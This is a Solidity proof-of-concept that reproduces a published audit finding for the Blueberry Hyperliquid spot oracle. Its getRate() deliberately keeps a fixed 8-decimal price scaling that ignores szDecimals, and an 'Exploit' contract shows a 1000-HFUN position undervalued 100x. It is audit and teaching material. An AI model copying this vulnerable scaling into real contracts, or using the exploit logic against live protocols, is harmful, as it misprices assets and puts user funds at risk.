// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Blueberry finding 61478 (H-01):
// "`getRate()` ignores `szDecimals`".
//
// Real audited source (the vulnerable `getRate` is reproduced VERBATIM from the
// finding's embedded ```solidity snippet; the vulnerable line is marked @>):
//   protocol Blueberry (Hyperliquid spot-price oracle)
//   report   github.com/pashov/audits/blob/master/team/md/Blueberry-security-review_2025-04-30.md  [H-01]
//
// Root cause: `getRate()` reads a raw spot price from the Hyperliquid SPOT-PX
// precompile and scales it by a FIXED `USDC_SPOT_SCALING = 10**(18-8)` — i.e. it
// assumes every asset's price has exactly 8 meaningful decimals. In Hyperliquid
// the number of meaningful price decimals is `8 - szDecimals`, so an asset with
// `szDecimals > 0` is UNDERPRICED by exactly `10**szDecimals`.
//   HFUN has szDecimals = 2; its precompile price of 37073000 means $37.073
//   (6 decimals), but `getRate()` interprets it as $0.37073 (8 decimals) — a
//   100x under-report. Every USD valuation derived from that rate is 100x low.
//
// The vulnerable scaling line is byte-for-byte the on-chain source. Faithful
// minimal doubles: the SPOT-PX precompile (returns the real raw uint64 price,
// 37073000, exactly like `cast call 0x...0808 ...0001`), and a universal
// "value = quantity x rate" oracle consumer (`valueOf`) as any protocol uses it.
// Only adaptation vs. source: the real `SPOT_PX_PRECOMPILE_ADDRESS = 0x...0808`
// constant is reproduced as an immutable pointing at the deployed precompile
// double, so the PoC needs no cheatcodes and runs standalone (does not affect
// the marked bug — the scaling line is unchanged).
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal base-oracle interface so `getRate` keeps its verbatim `override`.
interface IBaseOracle {
    function getRate(uint32 spotMarket) external view returns (uint256);
}

/// @dev Recreates the audited `Errors` custom-error library so the require line
///      stays verbatim.
library Errors {
    error PRECOMPILE_CALL_FAILED();
}

/// @dev Faithful double of the Hyperliquid SPOT-PX precompile (mainnet address
///      0x0000000000000000000000000000000000000808). Given `abi.encode(spotMarket)`
///      it returns the RAW uint64 spot price for that market, exactly as the real
///      precompile does. For the HFUN market it returns 37073000 (== the finding's
///      `cast call 0x...0808 0x...0001` result), i.e. $37.073 with 8-szDecimals=6
///      meaningful decimals.
contract SpotPxPrecompile {
    mapping(uint32 => uint64) internal _px;

    function set(uint32 spotMarket, uint64 rawPrice) external {
        _px[spotMarket] = rawPrice;
    }

    fallback(bytes calldata input) external returns (bytes memory) {
        uint32 spotMarket = abi.decode(input, (uint32));
        return abi.encode(_px[spotMarket]);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `getRate` is reproduced VERBATIM from the audited source.
// ─────────────────────────────────────────────────────────────────────────────
contract BlueberrySpotOracle is IBaseOracle {
    address public immutable SPOT_PX_PRECOMPILE_ADDRESS; // real source: address constant 0x...0808

    uint8 public constant USDC_SPOT_DECIMALS = 8;
    uint256 public constant USDC_SPOT_SCALING = 10 ** (18 - USDC_SPOT_DECIMALS);

    constructor(address precompile_) {
        SPOT_PX_PRECOMPILE_ADDRESS = precompile_;
    }

    function getRate(uint32 spotMarket) public view override returns (uint256) {
        (bool success, bytes memory result) = SPOT_PX_PRECOMPILE_ADDRESS.staticcall(abi.encode(spotMarket));
        require(success, Errors.PRECOMPILE_CALL_FAILED());
        uint256 scaledRate = uint256(abi.decode(result, (uint64))) * USDC_SPOT_SCALING; // @> VULN: scales by a FIXED 8-decimal factor, ignoring the asset's szDecimals; HFUN (szDecimals=2) is under-reported by 10**2 = 100x
        return scaledRate;
    }
}

/// @dev Faithful universal oracle consumer: the USD value of a token position is
///      `quantity * rate / 1e18` — how every protocol turns an oracle rate into a
///      position value. Not arbitrary machinery; just value = quantity x price.
contract OracleConsumer {
    IBaseOracle public immutable oracle;

    constructor(IBaseOracle oracle_) {
        oracle = oracle_;
    }

    function valueOf(uint32 spotMarket, uint256 qty) external view returns (uint256) {
        return (qty * oracle.getRate(spotMarket)) / 1e18;
    }
}

/// @dev Faithful minimal ERC20 marker used to record the USD misvaluation
///      (funds-at-risk) magnitude at the SINK address.
contract MarkerUSD {
    string public name = "USD (misvaluation marker)";
    string public symbol = "USD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: read the buggy rate for HFUN, compare against the correct rate
// (the finding's own recommended fix: multiply by 10**szDecimals), and prove a
// real HFUN position is under-valued by exactly 100x. The USD value put at risk
// is minted to SINK as the concrete accounting harm.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    // HFUN spot market, from the finding's worked example.
    uint32 internal constant HFUN_MARKET = 1;
    uint64 internal constant HFUN_RAW_PRICE = 37073000; // `cast call 0x...0808 ...0001` -> 37073000  ($37.073)
    uint8 internal constant HFUN_SZ_DECIMALS = 2; // per finding: HFUN szDecimals = 2
    uint256 internal constant POSITION_QTY = 1000e18; // a user's 1000-HFUN spot position

    MarkerUSD public usd;
    SpotPxPrecompile public precompile;
    BlueberrySpotOracle public vuln;
    OracleConsumer public consumer;

    uint256 public buggyRate; // getRate() result (100x too small)
    uint256 public correctRate; // rate with szDecimals applied (the recommended fix)
    uint256 public buggyValue; // protocol-perceived USD value of the position
    uint256 public correctValue; // true USD value of the position
    uint256 public valueAtRisk; // misvaluation = funds at risk

    constructor() {
        usd = new MarkerUSD(); // child nonce 1 (profit/marker token)
        precompile = new SpotPxPrecompile(); // child nonce 2
        vuln = new BlueberrySpotOracle(address(precompile)); // child nonce 3 (VULN)
        consumer = new OracleConsumer(IBaseOracle(address(vuln))); // child nonce 4

        // configure the precompile with HFUN's real raw price
        precompile.set(HFUN_MARKET, HFUN_RAW_PRICE);
    }

    function run() external {
        // 1) The vulnerable oracle scales by the fixed 8-decimal factor only.
        buggyRate = vuln.getRate(HFUN_MARKET); // 37073000 * 1e10 = 0.37073e18

        // 2) The correct rate applies szDecimals (the finding's recommended fix:
        //    ... * USDC_SPOT_SCALING * 10 ** (details.szDecimals)).
        correctRate = uint256(HFUN_RAW_PRICE) * vuln.USDC_SPOT_SCALING() * (10 ** HFUN_SZ_DECIMALS); // 37.073e18

        // 3) Value a real 1000-HFUN position both ways through the oracle consumer.
        buggyValue = consumer.valueOf(HFUN_MARKET, POSITION_QTY); // protocol thinks: $370.73
        correctValue = (POSITION_QTY * correctRate) / 1e18; // truth:            $37,073

        // 4) The misvaluation is the funds a protocol trusting this oracle puts at
        //    risk. Record it at SINK.
        valueAtRisk = correctValue - buggyValue; // $36,702.27
        usd.mint(SINK, valueAtRisk);

        // ── concrete harm: the position is under-valued by exactly 10**szDecimals ──
        require(buggyRate * (10 ** HFUN_SZ_DECIMALS) == correctRate, "rate not underpriced by szDecimals factor");
        require(buggyValue * (10 ** HFUN_SZ_DECIMALS) == correctValue, "position not misvalued by szDecimals factor");
        require(valueAtRisk == 36702.27e18, "unexpected value-at-risk magnitude");
        require(usd.balanceOf(SINK) == valueAtRisk && valueAtRisk > 0, "harm not recorded at sink");
    }
}
